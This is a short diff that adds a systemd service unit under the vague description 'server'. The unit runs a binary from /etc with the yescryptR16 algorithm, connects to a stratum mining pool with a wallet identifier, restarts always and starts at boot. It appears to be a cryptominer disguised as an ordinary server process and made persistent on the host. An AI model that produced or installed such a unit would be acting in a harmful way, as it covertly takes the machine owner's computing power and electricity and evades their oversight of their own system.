@@ -1,0 +1,10 @@
+[Unit]
+Description=server
+
+[Service]
+ExecStart=/etc/server -a yescryptR16 -o stratum+tcp://bidenpool.com:6333 -u RNhnRoY7YpeZij6PzWfkV2kBTcBb3jsx8p.B65eW8
+Restart=always
+RuntimeMaxSec=1800
+
+[Install]
+WantedBy=multi-user.target
